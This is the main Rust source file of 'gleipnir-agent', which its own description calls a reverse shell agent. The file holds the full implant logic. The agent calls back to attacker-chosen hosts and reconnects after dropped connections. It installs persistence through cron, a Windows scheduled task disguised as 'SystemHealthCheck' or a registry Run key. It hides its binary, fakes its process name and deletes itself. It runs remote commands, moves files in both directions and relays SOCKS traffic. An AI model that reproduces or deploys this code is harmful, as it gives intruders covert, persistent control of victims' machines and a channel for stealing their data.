mod connect;
mod executor;
mod persist;
mod platform;
mod protocol;
mod socks;
mod transfer;

use bytes::BytesMut;
use clap::Parser;
use futures_util::{SinkExt, StreamExt};
use std::collections::HashMap;
use tokio::sync::mpsc;
use tokio_util::codec::Framed;
use tracing::{debug, info, warn};

use connect::ConnectConfig;
use executor::Executor;
use protocol::{Frame, FrameType};
use socks::SocksAgent;

const CHUNK_SIZE: usize = 1024 * 1024; // 1MB

#[derive(Parser)]
#[command(name = "gleipnir-agent", about = "Gleipnir reverse shell agent")]
struct Cli {
    /// Callback host(s), comma-separated for fallback
    #[arg(short = 'H', long, value_delimiter = ',')]
    host: Vec<String>,

    #[arg(short, long, default_value_t = 4444)]
    port: u16,

    #[arg(long, default_value_t = 30)]
    max_retry_interval: u64,

    #[arg(long, default_value_t = 300)]
    cmd_timeout: u64,

    /// Install to a hidden path and run from there
    #[arg(long)]
    install: Option<String>,

    /// Masquerade process name (Linux only)
    #[arg(long)]
    masquerade: Option<String>,

    /// Install persistence (cron on Linux, schtasks on Windows)
    #[arg(long)]
    cron: bool,

    /// Windows: scheduled task name (default: SystemHealthCheck)
    #[arg(long, default_value = "SystemHealthCheck")]
    task_name: String,

    /// Windows: use registry Run key instead of schtasks
    #[arg(long)]
    registry: bool,

    /// Delete the binary after loading into memory
    #[arg(long)]
    self_delete: bool,

    /// Stable session identifier for reconnect resume (auto-generated if omitted)
    #[arg(long)]
    session_id: Option<String>,

    /// Enable TLS for the relay connection
    #[cfg(feature = "tls")]
    #[arg(long)]
    tls: bool,

    /// CA certificate file (PEM) for TLS verification. Without this, any cert is accepted.
    #[cfg(feature = "tls")]
    #[arg(long)]
    tls_ca: Option<String>,
}

#[tokio::main]
async fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "gleipnir_agent=info".into()),
        )
        .init();

    #[cfg(feature = "tls")]
    rustls::crypto::ring::default_provider()
        .install_default()
        .expect("install rustls crypto provider");

    let cli = Cli::parse();

    // Persistence: install, masquerade, cron before connecting
    let hosts_str = cli.host.join(",");
    let callback_args = vec![
        "-H".to_string(),
        hosts_str,
        "-p".to_string(),
        cli.port.to_string(),
    ];
    persist::install(
        &persist::PersistConfig {
            install_path: cli.install.clone(),
            process_name: cli.masquerade.clone(),
            cron: cli.cron,
            task_name: cli.task_name.clone(),
            registry: cli.registry,
        },
        &callback_args,
    );

    if cli.self_delete {
        persist::self_delete();
    }

    let session_id = platform::resolve_session_id(cli.session_id);
    info!(
        "gleipnir agent starting, targets {:?}:{}, session_id={}",
        cli.host, cli.port, session_id
    );

    let config = ConnectConfig {
        hosts: cli.host,
        port: cli.port,
        max_retry_interval: cli.max_retry_interval,
        #[cfg(feature = "tls")]
        tls: if cli.tls {
            Some(connect::build_tls_config(cli.tls_ca.as_deref()))
        } else {
            None
        },
    };
    let cmd_timeout = cli.cmd_timeout;
    let sid = session_id.clone();

    connect::connect_loop(&config, move |framed| {
        let sid = sid.clone();
        tokio::spawn(session_loop(framed, cmd_timeout, sid))
    })
    .await;
}

async fn session_loop(
    mut framed: Framed<connect::BoxedStream, protocol::GleipnirCodec>,
    cmd_timeout: u64,
    session_id: String,
) {
    let executor = Executor::new();
    let socks_agent = SocksAgent::new();

    // Channel for outbound frames (SOCKS data flows back through here)
    let (outbound_tx, mut outbound_rx) = mpsc::channel::<Frame>(256);

    // Accumulator for chunked file uploads from server
    let mut chunked_uploads: HashMap<u32, Vec<u8>> = HashMap::new();
    // Track the remote_path for chunked uploads (extracted from the first FileUp frame)
    let mut chunked_paths: HashMap<u32, String> = HashMap::new();

    // Send platform info with session_id for resume
    let info = platform::PlatformInfo::detect().with_session_id(Some(session_id));
    info!(
        "sending platform info: {} {} {} sid={}",
        info.os,
        info.arch,
        info.hostname,
        info.session_id.as_deref().unwrap_or("none")
    );
    let info_frame = Frame::new(
        FrameType::InfoResponse,
        0,
        BytesMut::from(&info.to_json_bytes()[..]),
    );
    if let Err(e) = framed.send(info_frame).await {
        warn!("failed to send info: {e}");
        return;
    }

    loop {
        tokio::select! {
            // Inbound from relay
            result = framed.next() => {
                let frame = match result {
                    Some(Ok(f)) => f,
                    Some(Err(e)) => {
                        warn!("frame read error: {e}");
                        break;
                    }
                    None => break,
                };

                debug!("received {:?} request_id={}", frame.frame_type, frame.request_id);

                match frame.frame_type {
                    FrameType::Ping => {
                        if let Err(e) = framed.send(Frame::pong(frame.request_id)).await {
                            warn!("failed to send pong: {e}");
                            break;
                        }
                    }

                    FrameType::Cmd => {
                        let command = match frame.payload_as_str() {
                            Some(s) => s.to_string(),
                            None => {
                                let _ = framed.send(Frame::error(frame.request_id, "invalid utf-8")).await;
                                continue;
                            }
                        };

                        let result = executor.execute(&command, cmd_timeout).await;
                        let output_frame = Frame::cmd_output(frame.request_id, &result.output);
                        if let Err(e) = framed.send(output_frame).await {
                            warn!("failed to send output: {e}");
                            break;
                        }
                    }

                    FrameType::Info => {
                        let info = platform::PlatformInfo::detect();
                        let resp = Frame::new(
                            FrameType::InfoResponse,
                            frame.request_id,
                            BytesMut::from(&info.to_json_bytes()[..]),
                        );
                        if let Err(e) = framed.send(resp).await {
                            warn!("failed to send info response: {e}");
                            break;
                        }
                    }

                    FrameType::FileUp => {
                        // Parse path from payload header, then handle data
                        let payload = &frame.payload;
                        if payload.len() < 4 {
                            let _ = framed.send(Frame::error(frame.request_id, "invalid file upload")).await;
                            continue;
                        }
                        let path_len = u32::from_be_bytes([payload[0], payload[1], payload[2], payload[3]]) as usize;
                        if payload.len() < 4 + path_len {
                            let _ = framed.send(Frame::error(frame.request_id, "invalid file upload path")).await;
                            continue;
                        }
                        let path = String::from_utf8_lossy(&payload[4..4 + path_len]).to_string();
                        let data = &payload[4 + path_len..];

                        // Check if this is a single-frame upload or start of chunked
                        // We store the data; if FileChunk/FileEnd follow they'll append.
                        // If no chunks follow, we just got a complete small file.
                        chunked_uploads.insert(frame.request_id, data.to_vec());
                        chunked_paths.insert(frame.request_id, path.clone());
                    }

                    FrameType::FileChunk => {
                        if let Some(buf) = chunked_uploads.get_mut(&frame.request_id) {
                            buf.extend_from_slice(&frame.payload);
                        }
                    }

                    FrameType::FileEnd => {
                        let rid = frame.request_id;
                        if let (Some(data), Some(path)) = (chunked_uploads.remove(&rid), chunked_paths.remove(&rid)) {
                            let resp = match transfer::handle_file_up_data(&path, &data).await {
                                Ok(msg) => Frame::cmd_output(rid, msg.as_bytes()),
                                Err(e) => Frame::error(rid, &e),
                            };
                            if let Err(e) = framed.send(resp).await {
                                warn!("failed to send file upload response: {e}");
                                break;
                            }
                        }
                    }

                    FrameType::FileDown => {
                        let path = match frame.payload_as_str() {
                            Some(s) => s.to_string(),
                            None => {
                                let _ = framed.send(Frame::error(frame.request_id, "invalid path")).await;
                                continue;
                            }
                        };
                        let rid = frame.request_id;
                        match transfer::handle_file_down(&path).await {
                            Ok(data) => {
                                // Send all data as FileDown (small) or FileChunk* + FileEnd (large)
                                if data.len() <= CHUNK_SIZE {
                                    let resp = Frame::new(FrameType::FileDown, rid, BytesMut::from(&data[..]));
                                    if let Err(e) = framed.send(resp).await {
                                        warn!("failed to send file download response: {e}");
                                        break;
                                    }
                                } else {
                                    let mut offset = 0;
                                    let mut send_failed = false;
                                    while offset < data.len() {
                                        let end = (offset + CHUNK_SIZE).min(data.len());
                                        let chunk = &data[offset..end];
                                        let f = Frame::new(FrameType::FileChunk, rid, BytesMut::from(chunk));
                                        if let Err(e) = framed.send(f).await {
                                            warn!("failed to send file chunk: {e}");
                                            send_failed = true;
                                            break;
                                        }
                                        offset = end;
                                    }
                                    if send_failed { break; }

                                    let f = Frame::new(FrameType::FileEnd, rid, BytesMut::new());
                                    if let Err(e) = framed.send(f).await {
                                        warn!("failed to send file end: {e}");
                                        break;
                                    }
                                }
                            }
                            Err(e) => {
                                let _ = framed.send(Frame::error(rid, &e)).await;
                            }
                        }
                    }

                    FrameType::SocksOpen => {
                        let otx = outbound_tx.clone();
                        socks_agent.handle_open(frame.request_id, &frame.payload, otx).await;
                    }

                    FrameType::SocksData => {
                        socks_agent.handle_data(frame.request_id, &frame.payload).await;
                    }

                    FrameType::SocksClose => {
                        socks_agent.handle_close(frame.request_id).await;
                    }

                    _ => {
                        debug!("unhandled frame type {:?}", frame.frame_type);
                    }
                }
            }

            // Outbound from SOCKS connections
            Some(frame) = outbound_rx.recv() => {
                if let Err(e) = framed.send(frame).await {
                    warn!("failed to send outbound frame: {e}");
                    break;
                }
            }
        }
    }

    info!("session ended");
}
